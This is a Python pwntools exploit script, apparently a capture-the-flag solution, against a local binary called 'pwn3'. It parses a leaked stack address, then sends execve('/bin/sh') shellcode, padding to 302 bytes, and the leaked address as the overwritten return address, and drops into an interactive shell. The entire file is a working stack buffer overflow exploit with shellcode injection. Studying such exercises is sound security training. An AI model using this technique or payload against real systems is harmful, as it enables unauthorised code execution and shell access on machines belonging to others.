#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./pwn3")

p = process("./pwn3")
# gdb.attach(p)

p.recvuntil("0x")

input_loc = p.recvline().strip()
input_loc = int(input_loc[:len(input_loc)-1].ljust(8,b'\x00'),16)

log.info(f'{hex(input_loc)=}')

#shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = b'a'*(302-len(shellcode))

payload= shellcode + padding + p64(input_loc)

p.sendline(payload)

p.interactive()
